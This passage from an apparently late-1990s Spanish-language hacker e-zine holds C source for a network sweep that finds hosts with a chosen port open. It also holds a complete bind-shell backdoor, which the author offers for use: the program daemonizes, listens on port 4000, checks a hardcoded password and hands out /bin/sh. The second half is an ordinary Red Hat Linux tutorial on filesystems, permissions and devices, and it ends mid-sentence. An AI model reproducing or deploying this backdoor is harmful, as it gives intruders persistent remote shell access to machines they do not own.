if((addr=inet_addr(ip))!=-1)
{
if((lookup=gethostbyaddr((char *) &addr, sizeof(long), AF_INET))!=NULL)
{
printf("%s %s\n", lookup->h_name, ip);
*lookup->h_addr_list++;
}
}
else
printf("Host desconocido %s\n", ip);
bzero(ip, 15);
strcpy(ip, argv[1]);
}
}
}


Lo que hace este  programa es  crear numeros  de ip,  del 1 al 255 y  usa  el
programa ( nuevamente ) que resuelve los nombres, o sea,  en la variable  ip,
mete  el  numero  200.200.200.1 y  trata de  encontrarlo, si  lo encuentra lo
muestra, sino, no lo muestra.

Y finalmente, les  explico porque  les mostre  un  resolvedor de  nombres, el 
PortScaner y el escaneador de IP's. 
Primero, tenemos un  programa que  resuelve  nombres,  luego un  programa que 
muestra los  puertos abiertos  en un servidor,  despues otro  que escanea una 
red en busca  de servidores,  entonces! podemos  crear un programa que busque 
en una red, servidores que tengan determinado  puerto  abierto,  por  ejemplo 
el 31337 o el 23, o el 12345, etc.  y  notese que  para hacerlo  debemos usar 
los tres programas anteriores.

Ya se que a ustedes insectos, les interesan solo los fuentes, asi que vamos a
ello.

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
main(int argc, char *argv[])
{
char ip[15];
int x, y, z, sock, puerto;
unsigned long addr;
struct hostent *lookup;
struct sockaddr_in cliente;
if(argc!=3)
{
printf("Uso: %s <numero de ip> <puerto>\n", argv[0]);
exit(0);
}
printf("\n\t\tIportScan v1.0");
printf("\n\tDesarrollado por Shisei Brujo\n\n");
puerto=atoi(argv[2]);
strcpy(ip, argv[1]);
for(x=0;x<3;x++) 
for(y=0;y<10;y++)
for(z=0;z<10;z++)
{
if((x+y+z)>0)
{

if((x==2)&&(y==5)&&(z==5))
{
printf("Trabajo terminado.\n", puerto);
exit(0);
} 
ip[strlen(ip)]='.';
if((x==0)&&(y==0))
ip[strlen(ip)]=toascii(z+48);
else
if(x==0)
{
ip[strlen(ip)]=toascii(y+48);
ip[strlen(ip)]=toascii(z+48);
}
else
{
ip[strlen(ip)]=toascii(x+48);
ip[strlen(ip)]=toascii(y+48);
ip[strlen(ip)]=toascii(z+48);
}
if((addr=inet_addr(ip))!=-1)
{
if((lookup=gethostbyaddr((char *) &addr, sizeof(long), AF_INET))!=NULL)
{
if((sock=socket(AF_INET, SOCK_STREAM, 0)) < 0)
{
printf("Error al crear socket.\n");
exit(-1);
}
cliente.sin_family=AF_INET;
cliente.sin_addr.s_addr=inet_addr(ip);
cliente.sin_port=htons(puerto);
bzero(&(cliente.sin_zero), 8);
if((connect(sock, (struct sockaddr*)&cliente, sizeof(cliente))) > -1)
{
printf("%s %s Ok\n", lookup->h_name, ip);
*lookup->h_addr_list++;
}
close(sock);
}
}
else
printf("Host desconocido %s\n", ip);
bzero(ip, 15);
strcpy(ip, argv[1]);
}
}
}

Parece todo  perfecto,  pero no lo es  juaaa!, este programa tiene un peque~o
problema ( o un gran problema ). Por  alguna  extra~a razon,  se queda parado
al econtrar un cuarto o tercer host con el puerto abierto.
Alguien  me  puede  explicar esto !!!!  tal  vez sea  una  peque~a pifia, una
variable  mal  asignada,  etc.  o  tal  vez  simplemente   cuando  lo   probe
la wea resulto mal, realmente  no lo  se y  agradeceria  a la  persona que me 
diera una solucion o que lo probara con  su propia red  ( con esto  se podria 
hacer un concurso o algo asi, que venga la modelo !!! ).

Pero no se pueden quejar, de algo les serviran estos fuentes.  Y  ademas  que 
por este dia,  y  solamente por  este dia,  por encargo  de la  distribuidora
"andate a la mierda S.A." les incluire otro codigo fuente.
y este si funciona :)

Es un backdoor bastante conocido, pero lo he arreglado de manera que  te pida
un password  para entrar.  Que  lata que otras  personas se  aprovechen de tu
trabajo o no ?.
Bueno, ahi les va el fuente:

#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#define PORT 4000
int main () 
{ 
int x, soc_des, soc_cli, soc_rc, soc_len, server_pid, cli_pid;
char buffer[1024], buff[1024], password[]="password";
struct sockaddr_in serv_addr; 
struct sockaddr_in client_addr;
if((soc_des = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP))==-1)
exit(-1); 
bzero((char *) &serv_addr, sizeof(serv_addr));
serv_addr.sin_family = AF_INET; 
serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
serv_addr.sin_port = htons(PORT); 
if((soc_rc=bind(soc_des, (struct sockaddr *)&serv_addr, sizeof(serv_addr)))!=0)
exit(-1); 
if (fork()!=0)
exit(0); 
setpgrp(); 
signal(SIGHUP, SIG_IGN);
if (fork()!=0) 
exit(0);
if((soc_rc = listen(soc_des, 5))!=0)
exit(0); 
while (1) 
{ 
soc_len = sizeof(client_addr);
if((soc_cli = accept(soc_des, (struct sockaddr *)&client_addr,&soc_len))<0)
exit(0); 
cli_pid = getpid(); 
if((server_pid= fork())!=0)
{ 
send(soc_cli, "Password:\n", 10, 0);
recv(soc_cli, buffer, sizeof(buffer), 0);
for(x=0;x<strlen(buffer)-2;x++)
buff[x]=buffer[x];
if((strcmp(buff, password))==0)
send(soc_cli, "Maestro, Ordene!\n", 17, 0);
else
{
send(soc_cli, "Chupalo!\n", 9, 0);
exit(0);
}
dup2(soc_cli,0); 
dup2(soc_cli,1); 
dup2(soc_cli,2);
execl("/bin/sh","sh",(char *)0); 
close(soc_cli); 
exit(0); 
} 
close(soc_cli);
}
}

Y  eso  seria  todo  por  hoy,  espero que  les haya  gustado,  y que  puedan
solucionar el peque~o problema del  IportScan, si  alguien lo hace,  me puede
enviar la respuesta a shisei_brujo@latinmail.com.
Esta de mas decir que cualquier duda, consulta, etc. a mi correo.

Good Hack
Good bye
Good night 


:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:
-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-

             ..--:: 06. Descubriendo Linux Red Hat 5.0 ::--..
                              by Mr. Nuk3m


[NdE: Continuamos con la segunda  entrega de  este enooooorme  articulo sobre
      RedHat :) ]

   2. Estructura General Del Sistema De Archivos
      2.1  Sistema De Archivos
           2.1.1  Nombres de archivos
           2.1.2  Atributos de los archivos
           2.1.3  Directorios
           2.1.4  Estructura del sistema de archivos
           2.1.5  Rutas dentro del sistema de archivos
           2.1.6  Los "links" y los archivos
      2.2  Estructura General De Un Sistema De Archivos Linux
   3. Usuarios, Permisos y Grupos
      3.1  Permisos de acceso
      3.2  Directorio "home" y permisos predefinidos
   4. Dispositivos De Entrada-Salida
      4.1  Conceptos Fundamentales
           4.1.1  Puertos de entrada-salida
           4.1.2  Iterrupciones e IRQ's
           4.1.3  Accesos Directos a Memoria (DMA)
      4.2  Tratamiento de los dispositivos en Linux
           4.2.1  Archivos de los dispositivos mas comunes


 CAPITULO 2

 ESTRUCTURA GENERAL DEL SISTEMA DE ARCHIVOS

 2.1 SISTEMA DE ARCHIVOS

 La parte del sistema operativo que fija como los archivos son estructurados,
 nombrados,  accesidos,  usados,  protegidos  e implementados se  conoce como
 "Sistema de Archivos".

 Desde el punto de vista del usuario, el aspecto mas importante de un sistema
 de archivos es  la  estructura  que  refleja  el  sistema de  archivos,  que
 constituye un archivo, como  los archivos  se nombran  y  se  protegen,  que
 operaciones estan permitidas sobre los archivos, etc.

 2.1.1 NOMBRES DE ARCHIVOS

 Las reglas exactas para nombrar  archivos,  varian de sistema en sistema. En
 el caso de Unix es posible tener nombres de archivos de hasta 255 caracteres.
 Por lo tanto los siguientes nombres son totalmente validos:

  Tony, reporte, README.TXT, ls, cp, Resultados de la primera Fecha - Basket

 Una caracteristica importante a tener en cuenta es que en Unix/Linux  cae en
 la categoria de sistemas que distinguen  entre  letras  minusculas y  letras
 mayusculas, es decir  que es  "case-sensitive". Por lo tanto se consideraran
 como archivos distintos los siguientes nombres:

  tony, Tony, TONY, tONY

 Muchos sistemas operativos dividen el nombre de un archivo en dos partes que
 se separan por un punto. La parte que  se encuentra  despues  del  punto  se
 llama "extension". En MS-DOS, por ejemplo, los nombres de los archivos deben
 formarse con un nombre de 1 a 8  caracteres, con una extension opcional de 1
 a 3 caracteres. En Linux la extension  es opcional y puede tener la cantidad
 de caracteres que el usuario quiera.  Asimismo es  posible  definir archivos
 con dos o mas extensiones. Ejemplos:

  README.linux, linux-2.2.5.tar.gz

 En Linux no existe ninguna restriccion  en las extensiones  de  los archivos
 que implique la asociacion del mismo con ciertas operaciones. En MS-DOS, por
 ejemplo, solo es posible ejecutar  archivos con las  extensiones .BAT, .EXE,
 .COM. En Linux para  poder  ejecutar  un  archivo  se  imponen  otro tipo de
 restricciones que seran tratadas mas adelante.

 Sin embargo, algunos programas o utilidades exigiran ciertas extensiones  en
 los archivos sobre los cuales se quiera trabajar. Por ejemplo el  compilador
 de C de distribucion libre que viene con las distribuciones  Linux,  llamado
 gcc (GNU C Compiler), insistira en que los archivos fuente  tengan extension
 .c al final del nombre del archivo. Hay que tener en cuenta  que  esto no es
 una restriccion impuesta por el S.O. sino que es  el programa  el  que exige
 este tratamiento.

 2.1.2 ATRIBUTOS DE LOS ARCHIVOS

 Los principales atributos de  los  archivos  en Linux tienen que ver con sus
 permisos de acceso,  su  propietario,  grupo al  que pertenece  (todos estos
 conceptos  se  trataran mas  adelante),  su tama~o  en bloques, y  su ultima
 fecha de modificacion.

 En el sistema  MS-DOS, los archivos ocultos se identificaban con un atributo
 llamado HIDDEN. En Linux, en cambio, no existe ningun atributo especial para
 determinar cuando un archivo es oculto.  La distincion  se realiza  sobre el
 nombre de archivo.  Los nombres  de los  archivos que comienzan con un punto
 son considerados archivos ocultos. Ejemplos:

  .Xclients, .bash_history, .emacs

 2.1.3 DIRECTORIOS

 Con respecto a los  directorios y sus nombres y sus atributos, todo lo dicho
 antes para los  archivos se  aplica de igual manera para los directorios, ya
 que en Linux son a su vez archivos normales.

 La estructura de directorios de la mayoria de los sistemas es una estructura
 de arbol. Esto quiere decir que se  tiene un  directorio raiz,  el cual a su
 vez puede tener varios subdirectorios y asi sucesivamente.

 Linux Fue desarrollado  con el  objetivo  de ser  multiusuario y  de su alta
 integracion en redes, por lo que uno  de los objetivos  fundamentales fue el
 hacer posible el trabajo en grupos y compartir informacion. Con el modelo de
 directorios  en  forma  de  arbol  es  imposible  permitir  que  se comparta
 informacion  entre  varios usuarios,  por eso Linux  fue mas alla  y baso su
 sistema de  archivos en  la estructura de grafo aciclico (FIGURA 2.1) que es
 una generalizacion natural del del esquema de directorios jerarquico.

 2.1.4. ESTRUCTURA DEL SISTEMA DE ARCHIVOS

 En sistemas como MS-DOS  las  distintas  unidades de  disco,  CD-ROM,  disco
 flexible, etc., se manipulan con una estructura de directorios propia.  Esto
 quiere decir que cada unidad tiene un directorio raiz  y  una estructura  de
 subdirectorios determinada. Para diferenciar las  distintas unidades  se les
 asigna una letra a cada una de ellas. Asi tenemos la unidad A, la  unidad C,
 etc.

 En Linux, esta estructura definitivamente no es adecuada porque  trae muchos
 problemas  de  mantenimiento.  Mas  aun,  es totalmente  inaplicable  en los
 sistemas de archivos de red como lo son NFS, SMB, etc.  El hecho de  fijar a
 cada una de las unidades una letra que debe mantenerse para siempre -o todos
 los programas perderan  las referencias  de nombres-  es una  limitacion muy
 grande en un sistema tan flexible como Linux :)

 2.1 SISTEMAS DE ARCHIVOS

                        ________________________
                        | Tony | Juan | README |
                        /-----------\-----------\
                      /              \           \-----\
        ____________/_________       _\_____________    \
        | mail | TODO | prog |       | prog | mail |     @
       /---------/------|----        -/---------\---
      /         /       |           /            \
     /        /      ___|__________/____________   \
    /       /       /   |         /             \    \
   /      /        |   _|________/___________    |     @
  @      @         |   | mod1 | mod2 | exec |    |
                   \_  ---|------|------|----   _/
                     \    |      |      |     _/ <-----_
                      \_  |      |      |   _/          |
                        \-|------|------|--/            Estos directorios
                          |      |      |               estan compartidos por
                          |      |      |               los usuarios Tony y
                          @      @      @               Juan.


 FIGURA 2.1: ESTRUCTURA DE SISTEMA DE ARCHIVOS ACICLICA. EJEMPLO DE UN
             DIRECTORIO COMPARTIDO.

 Para solucionar esto, Linux utiliza el concepto de particion raiz y sistemas
 de archivos montados sobre la particion raiz. Esto  significa que  todas las
 unidades utilizaran  una estructura de  directorios comun.  Asi no existiran
 varias  unidades  y  una  estructura  de  directorios  por unidad,  sino que
 existira una unica estructura de directorios y sobre ella se  acomodaran las
 distintas unidades, inclusive las que se comparten en redes.

 La particion raiz  es  llamada "/"  y  es  el  directorio  principal  de  la
 estructura. Las unidades, antes de poder ser usadas,  deben ser  montadas en 
 el sistema de archivos. Para ello  debe existir un  "punto de montaje" donde 
 alojar la informacion  de la unidad.  Un punto  de montaje no  es mas que un 
 directorio cualquiera dentro del sistema  de archivos, que  debe encontrarse 
 vacio.

                        _______________________
                        | mnt | Tony | README |
                        --/------|---------\--
                        /         \          \______
                   ___/__         __\____________   \
                   |    |         | prog | mail |    @
                   ------         ------------\--
                                                \
                                                  \
                              ____________________  @
                             | mod1 | mod2 | exec |
                              --|------|------|---   
                                |      |      |
                                |      |      |
                                @      @      @

 FIGURA 2.2: EJEMPLO DE MONTAJE DE UNA UNIDAD. ESTADO DEL SISTEMA DE ARCHIVOS
             PREVIO AL MONTAJE.

                        _______________________
                   /    | mnt | Tony | README |
                        --/------|----------\--
                        /         \          \______
        ______________/__         __\____________   \
        | part1 | part2 |         | prog | mail |    @
        --/--------/-----         -------------\-
         /        /                             \
        /        /                               \
       @        @             ____________________@
                             | mod1 | mod2 | exec |
                              --|------|------|---
                                |      |      |
                                |      |      |
                                @      @      @

 FIGURA 2.3: EJEMPLO DE MONTAJE DE UNA UNIDAD. ESTADO DEL SISTEMA UNA VEZ
             REALIZADO EL MONTAJE.

 Veamos un ejemplo de montaje de una unidad  en Linux. El  estado del sistema
 de archivos antes de montar la unidad es el que muestra la figura 2.2.
 Supongamos que queremos montar un disquettes que posee dos archivos llamados
 "part1" y "part2" en el punto de montaje dado por el  directorio "/mnt".  El
 directorio esta  vacio,  por lo  que no hay  ningun  problema. El estado del
 sistema de archivos despues de realizar el montaje se  muestra en  la figura
 2.3.

 Una vez  que  se monta la  unidad dentro  del sistema  de archivos  se puede
 utilizar  como si fuese  cualquier  directorio dentro  de la  estructura. La 
 unica  diferencia es  la forma  en la que  se accede a los datos, ya  que un 
 directorio dentro del sistema de archivos puede corresponder a una particion
 del  disco  rigido,  un  disquette,  un  CD-ROM o  una unidad de  red que se 
 encuentra en otra maquina. Afortunadamente, el sistema se  ocupara de tratar 
 con  el dispositivo que  corresponda, de la  forma adecuada,  para obtener y 
 guardar la informacion. El  tratamiento  que Linux aplica  a cada directorio 
 del sistema de archivos se realiza de forma totalmente  transparente para el
 usuario :)

 Esta forma de tratar las unidades  trae, por  supuesto, muchas  ventajas. La
 belleza  de  los  sistemas  de  archivos  montados, por sobre  las  unidades
 basadas  en letras, recae en la transparencia. Uno puede agregar unidades al
 sistema sin romper las referencias de las aplicaciones existentes.

 En el modelo de las unidades con letras, cada vez que se agregan unidades al
 sistema, cambian las letras de las unidades. Asi la  mayoria del  software y
 algunos S.O. se confunden cuando esto pasa. Tipicamente se termina  teniendo
 que reinstalar los programas cada vez que se mueve algun disco de lugar.
 Este juego se vuelve ridiculo cuando se utilizan unidades de red.

 En Linux  los  sistemas  de  archivos  de  red,  estan  designados desde  un 
 principio con el objetivo de la transparencia. Asi se pueden mover  archivos
 y aplicaciones de una maquina a otra en la red y ser compartidos ya  que sus
 puntos de montaje no tienen porque cambiar.

 Lo que puede resultar incomodo es el hecho de tener que montar las  unidades
 antes de usarlas. Esto es verdad, pero  solo  con  las  unidades  extraibles
 (unidades de discos flexibles,  o  CD-ROM's),  ya  que  las  unidades  fijas 
 (discos rigidos, unidades de red, etc.)  se  configuran para  que  se monten
 automaticamente.

 2.1.5 RUTAS DENTRO DEL SISTEMA DE ARCHIVOS

 Las rutas  (PATH) se  utilizan  para  referirse a determinados directorios o
 archivos dentro del sistema de archivos.  Ya  hablamos del  directorio  raiz
 del sistema, el cual es llamado "/".  Dentro  de este se  pueden crear otros
 directorios y archivos. Por ejemplo, si creamos un archivo llamado  "Come As
 You Are.mp3" en el directorio raiz, entonces para referirnos a el tenderemos
 que  especificar  la  siguiente  ruta:  /Come As you Are.mp3.  Si creamos un
 directorio  llamado "home" nos referiremos a el como /home o /home/. Esto es
 posible porque es un directorio.

 Generalizando,  podemos encontrar encontrar un  directorio  llamado  "linux" 
 que se encuentra  dentro  del  directorio  "src" que  a su  vez se encuentra 
 dentro del directorio "usr" que es un subdirectorio del directorio  raiz. La 
 ruta adecuada sera: /usr/src/linux.

 Las rutas no siempre se estructuran de esa manera. Todos  los ejemplos dados
 en el parrafo anterior corresponden a  "rutas absolutas".  Esto quiere decir
 que son rutas completas,  ya  que marcan  el camino desde el directorio raiz
 hasta el archivo o directorio deseado. Tambien  es posible  utilizar  "rutas
 relativas". Las  rutas relativas  se construyen  dependiendo del punto en el
 sistema de archivos  donde  nos  encontramos  ya  que  en  cada  momento nos
 encontramos en  un cierto  punto  del  sistema  de  archivos  (el directorio
 actual o el  de trabajo)  y podemos cambiar de directorio, desplazandonos en
 la jerarquia. Toda ruta  que comience con una barra ("/") es considerada una
 ruta absoluta, toda otra ruta es considerada ruta relativa.
 
                        _______________________
                        | mnt | Tony | README |
                        --/------|----------\--
                        /         \          \______
                      /           __\____________   \
                     @            | prog | mail |    @
                                  -------------\-
                                                \
                                                  \
                              ____________________  \
                             | mod1 | mod2 | exec |  _\_______________
                             ---|------|------|---   | mess | attach |
                                |      |      |      ---|-------|-----
                                |      |      |         |       |
                                @      @      @         @       @
                                                         

 FIGURA 2.4: EJEMPLO DE RUTAS RELATIVAS. ARBOL DE DIRECTORIOS

 Como ejemplo de rutas relativas  consideremos la  estructura del  sistema de
 archivos que muestra la figura 2.4, pueden darse las siguientes situaciones:

  * Si nos encontramos en el directorio /, entonces la ruta  Tony/mail/attach
    se refiere al archivo attach que se encuentra dentro del  directorio mail
    que es un subdirectorio del directorio Tony. Facil :)

  * Si nos en el directorio /Tony/mail entonces  las rutas ./attach y  attach
    ambas se  refieren  al mismo archivo de los ejemplos  anteriores. Tambien
    Facil :))

  * Si  nos  encontramos  en  el  directorio  Tony/prog,  entonces  la   ruta
     ../mail/attach se refiere al mismo archivo que el ejemplo  anterior.  Un
     poco mas dificil :|

  * Si el directorio en el que nos encontramos es Tony/prog entonces  la ruta
    ../../README  se  refiere  al  archivo  README  que  se  encuentra  en el
    directorio raiza. Muy dificil ;(

 HARD LINKS

 Los "hard links" (links "duros") son links directos al  inodo ( no INODORO )
 del archivo y nos permiten tener mas de un archivo apuntando al mismo inodo.
 Desde un punto de vista practico dos archivos  con  el  mismo inodo  son  el 
 mismo archivo. Los cambios realizados sobre un archivo  seran reflejados  en 
 el otro y viceversa. Lo unico que hay que tener en cuenta es que para borrar
 un archivo del sistema de archivos  hay que borrar  todos los hard links que 
 el mismo  posea.  Por  ejemplo,  si  el  archivo doc1.tex es un hard link al 
 archivo  ejemplo1.tex,  al borrar el  ultimo no estamos borrando el primero. 
 Para borrar definitivamente el archivo hay  que  borrar  tambien el  archivo 
 doc1.tex. La unica restriccion que poseen los hard links es que  solo pueden
 definirse dentro de un sistema  de archivos,  porque  los inodos  son unicos 
 internamente a un sistema de archivos.

 Los directorios "." y ".." son hard  links  y  estan  presentes en todos los
 directorios del sistema de archivos. El  primero  es un  hard link  al mismo
 directorio y el segundo apunta al directorio padre. En particular la entrada
 ".." en el directorio "/" apunta a si  mismo;  es  decir  que  el  padre del
 directorio raiz es el mismo.

 LINKS SIMBOLICOS

 Los links simbolicos  son otro  tipo  de  links  que tambien permiten darles
 varios nombres a un archivo pero no asocian a  los  archivos por  numeros de 
 inodo. Por esto los links simbolicos no  tienen la restriccion  de tener que 
 permanecer al mismo sistema de archivos y pueden referenciar  archivos entre
 sistemas de archivos.  Esto  quiere decir  que  un link  simbolico  tiene su 
 propio numero de inodo pero apunta a otro archivo.

 Funcionalmente, los hard links y los links simbolicos son  similares, aunque
 tiene algunas diferencias. Por ejemplo, se  pueden crear  links simbolicos a
 archivos que no existen, esto no es posible con los hard links.

 2.2 ESTRUCTURA GENERAL DE UN SISTEMA DE ARCHIVOS LINUX

 En un sistema  de archivos  Linux encontraremos  los siguientes  directorios
 importantes que forman parte del sistema y tiene funciones particulares:

  /bin  Archivos binarios o ejecutables. Aqui encontraremos los  comandos mas
        utilizados. Los comandos que se encuentren en este  directorio pueden
        ser ejecutados por todos los usuarios del sistema.

  /dev  Archivos que representan los dispositivos del sistema.

  /etc  Archivos de configuracion y pesonalizacion  del sistema. Solo pueden
        ser modificados por el superusuario (ROOT).

  /sbin  Ordenes ejecutables solo por el superusuario.

  /home  Directorio donde  se crean los directorios home de los  usuarios del
         sistema.

  /lib  Librerias escenciales del sistema. 

  /proc  Es una estructura  virtual de  archivos utilizada por el kernel para
         mostrar la informacion del sistema y su configuracion.  A traves del
         mismo es posible ver la informacion de  las interrupciones,  puertos
         de entrada/salida, uso  del CPU,  memoria, particiones, modulos, asi
         como la informacion de cada proceso en particular y de los distintos
         dispositivos instalados en el sistema.

  /tmp  Directorio que se utiliza como almacenamiento de archivos temporales.

  /var  Informacion de la historia del sistema. Se  guardan los  mensajes que
        los procesos realizan al ejecutarse, informacion de debug, archivos a
        imprimir, mensajes de correo a ser distribuidos, etc.

  /boot  Archivos e informacion necesaria para el arranque del sistema.

  /usr  Programas, herramientas  y  utilidades  instaladas en el sistema como
        extension del S.O.

  /usr/bin  Binarios y ejecutables de los programas agregados al sistema.

  /usr/src  Codigo fuente de los programas.

  /usr/src/linux  Codigo fuente del kernel del sistema.

  /usr/man  Manuales de los comandos del sistema y de los programas agregados

  /usr/X11  Archivos del sistema de ventanas X Windows.

  /usr/X11/bin  Archivos ejecutables del sistema de ventanas.

  /usr/local  Software  agregado  localmente  al  S.O.  En este directorio se 
              suele instalar todo el software que agregamos luego de realizar 
              la instalacion.



 CAPITULO 3

 USUARIOS, PERMISOS Y GRUPOS

 El sistema operativo Linux es un sistema multiusuario. Esto quiere decir que
 un numero cualquiera de personas pueden  trabajar en el  sistema, ya  sea de 
 forma  simultanea o  no. Para  comenzar a  trabajar  en el  sistema Linux es
 necesario  iniciar  una  sesion,  esto  quiere  decir  que  el  sistema  nos 
 preguntara el nombre de usuario con el cual queremos iniciar la sesion. Este
 proceso se conoce como LOG IN.

 Para que el sistema se asegure que la persona que intenta  inciar una sesion
 corresponde al usuario indicado se asocio una contrase~a (PASSWORD) con cada
 nombre  de  usuario.  La  contrase~a  solamente la  debe conocer  el usuario
 propietario de la cuenta.

 Como parte del proceso de inicio de  sesion se debe  ingresar la  contrase~a
 apropiada, la cual sera encriptada por el sistema inmediatamente y chequeada
 contra  la base  de datos  de contrase~as  y  guardada  en  el sistema. Este 
 proceso  se  conoce  como  autenticacion del  usuario.  Si la  contrase~a es 
 chequeada  satisfactoriamente  entonces el  usuario comienza su sesion en el 
 sistema. De otra forma se rechaza la solicitud de comienzo de sesion.

 Para que este esquema de autenticacion funcione, es necesario que exista una
 forma  de  crear  cuentas  de  usuario  y  de  asociarles  sus   respectivas
 contrase~as, y ademas  no se  debe permitir  a cualquier  usuario  que pueda
 realizar estas tareas. Para solucionar estos y otros problemas de seguridad,
 Linux posee una cuenta predefinida  llamada "root".  Esta es la  cuenta  del
 superusuario, y es el unico  usuario  que esta  autorizado  a crear cuentas,
 asignarles  contrase~as y  eliminarlas  si es  necesario. Estos  no son  los 
 unicos permisos que posee esta cuenta;  en realidad  en una  sesion iniciada 
 como  el  superusuario,  root,  es  posible  realizar todas las  operaciones 
 necesarias para la administracion del sistema.

 El esquema de autenticacion de usuarios es necesario pero no suficiente.  El
 hecho de que Linux  utilice la estructura de un unico sistema de archivos  y
 de que sea un sistema multiusuario hacen que sea indispensable un sistema de
 permisos aplicable sobre los usuarios para con  los archivos.  Imaginemos un
 entorno en el cual no  existieran  permisos sobre  los archivos y existieran
 multiples usuarios. Facilmente un usuario podria leer,  modificar  e incluso
 borrar  archivos  de  otro  usuario,  o  podrian  darse  otras   situaciones
 indeseables para  con la  seguridad  del  sistema.  Para evitar  esto  Linux
 establece  un  mecanismo  de  proteccion  de  archivos que funciona mediante
 permisos y grupos.

 Anteriormente, cuando hablamos de los atributos  de un archivo,  mencionamos
 que  un  archivo  tiene  asociado  un  usuario y  un grupo.  Estos atributos
 establecen quien es el usuario due~o del archivo y  a que grupo  de usuarios
 pertenece. Los grupos son  conjuntos de  usuarios que  tambien son definidos
 por el superusuario como parte  de la  administracion  del sistema y  sirven 
 para agrupar a varios usuarios  con caracteristicas  de  acceso  al  sistema 
 similares. El concepto de grupos de usuario facilita enormemente la tarea de
 administrar los permisos en sistemas con gran cantidad de usuarios.

 3.1 PERMISOS DE ACCESO

 Ademas de  los atributos de usuario  y grupo,  un  archivo  tiene  asociados
 "permisos de acceso" que determinan las operaciones que son permitidas sobre
 el mismo por parte de cada usuario. Los permisos de un archivo se dividen en
 tres partes:

  * DUE¥O: El usuario que creo el archivo es el due~o del mismo. El due~o  es
           determinado por el atributo del archivo que especifica quien es el
           due~o.

  * GRUPO: El  conjunto de  usuarios que  comparten  el  archivo y  necesitan
           permisos  de acceso similares. El grupo sobre el cual recaen estos
           permisos  es  el  grupo  al  cual  pertenecen  el  archivo como lo
           determina el atributo de grupo.

  * OTROS (Universo): El  universo  se constituye de todos los demas usuarios
                      que no son ni due~os del archivo ni pertenecen al grupo
                      del archivo.

  Dentro de cada categoria,  los permisos  se dividen  en tres  grupos: leer,
  ecribir y ejecutar.

  PERMISO DE LECTURA: Deja a un usuario ver el contenido de un archivo o,  en
                      el caso de los directorios poder listar su contenido.

  PERMISO DE ESCRITURA: Permite  escribir  en  los  archivos  o  modificar su
                        contenido. En  el caso  de  los  directorios  permite
                        crear  nuevos   archivos   o  borrar   archivos   del 
                        directorio.

  PERMISO DE EJECUCION: Deja que el usuario pueda ejecutar el archivo, ya sea
                        como un programa o como  un  script de  comandos.  El
                        permiso de ejecucion sobre un directorio  nos permite
                        cambiar el directorio de trabajo.

 Este  mecanismo de  permisos  nos garantiza  seguridad y simultaneamente nos
 permite  compartir  archivos  con  grupos de  usuarios.  Pero para  que este
 esquema  funcione  adecuadamente,  la  pertenencia a  los  grupos  debe  ser
 controlada rigidamente por el administrador del sistema.

 Los permisos asociados con un archivo dependen  tambien de los  permisos que
 tenga asignado el directorio donde se encuentra el archivo.  Por ejemplo, si
 un usuario tiene permisos de lectura y  escritura  sobre un  archivo pero no
 tiene permiso de lectura ni de ejecucion  sobre  el directorio en el cual se
 encuentra el archivo, entonces no podra leer ni escribir el archivo.
 Generalizando, para poder acceder a un archivo es necesario tener permiso de
 ejecucion en todos los directorios que forman parte de la ruta del  archivo,
 ademas del permiso adecuado sobre el archivo.

 3.2 DIRECTORIO "HOME" Y PERMISOS PREDEFINIDOS

 Cuando el  administrador  del  sistema  crea  una  cuenta,  crea  ademas  un
 directorio,  el cual sera propiedad del usuario que solicito la cuenta. Este
 directorio es llamado "directorio home" y constituye el lugar en el  sistema
 de archivos donde el usuario puede guardar sus archivos. El usuario tiene un
 control  total sobre los  permisos  de su  directorio  home.  El acceso  del
 usuario a otros directorios estara regido por los permisos correspondientes.
 Cuando un usuario inicia una sesion en el sistema, su directorio  de trabajo
 es su directorio home.

 Al crear un nuevo archivo o directorio, el sistema asigna una combinacion de
 permisos predeterminada. Los permisos predefinidos para los  archivo son: de
 lectura y escritura para el due~o y de lectura y ejecucion para el universo.
 Para los directorios son: de lectura, escritura y ejecucion para  el due~o y
 de lectura y ejecucion para el grupo y para el universo (otros usuarios).

 En cualquier momento, el usuario que es due~o del archivo o directorio puede
 cambiar sus permisos para gestar la combinacion que desee.



 CAPITULO 4

 DISPOSITIVOS DE ENTRADA/SALIDA

 4.1 CONCEPTOS FUNDAMENTALES

 Los dispositivos de entrada/salida utilizados en las computadoras pueden ser
 divididos,  esencialmente,  en  dos  categorias:  dispositivos de  bloques y
 dispositivos de caracter.

 Un dispositivo de bloque  se  caracteriza  por  guardar  la  informacion  en
 bloques de tama~o fijo, cada uno con su direccion.  Los  tama~os de  bloques 
 mas comunes se encuentran en el rango de 512 bytes a 32768 bytes (32 Kb). La
 propiedad esencial de los  dispositivos de  bloque es  que es posible leer o 
 escribir cada bloque independientemente de todos los demas. Los "discos" son
 los dispositivos de bloque mas comunes.

 El otro tipo de dispositivos de entrada/salida es el dispositivo de caracter
 Un dispositivo de caracter  envia  o  acepta  secuencias  de  carateres  sin
 relacion a una estructura de bloque. No  tiene  direccionamiento  y  por  lo 
 tanto  no   tiene  ninguna   estructura   mecanica  interna   para  realizar 
 posicionamientos.  Los  siguientes  dispositivos  pueden  ser   vistos  como 
 dispositivos de carater: impresoras, ratones, interfaces de red, etc.

 Este esquema de clasificacion  no  es  perfecto.  Algunos  dispositivos  son
 dificiles  de  clasificar  en  estas  categorias.  Sin  embargo,  para fines 
 practicos esta clasificacion nos sera suficiente.

 A continuacion  se  describen  conceptos  esenciales  para el  tratamiento y
 configuracion de los dispositivos de  entrada/salida.  Estos  conceptos  son
 importantes a  la  hora de instalar  cualquier  dispositivo  sobre  Linux  y
 determinan  el  exito  o  el  fracaso  de  la  instalacion  y  el   correcto
 funcionamiento del dispositivo.

 4.1.1 PUERTOS DE ENTRADA/SALIDA

 Asi como el sistema accede a memoria,  tanto  para lectura  como  escritura, 
 debe poder acceder a los  dispositivos de  entrada/salida.  En las  maquinas 
 basadas en las arquitecturas Intel 80x86 existe un  espacio de  direccionado 
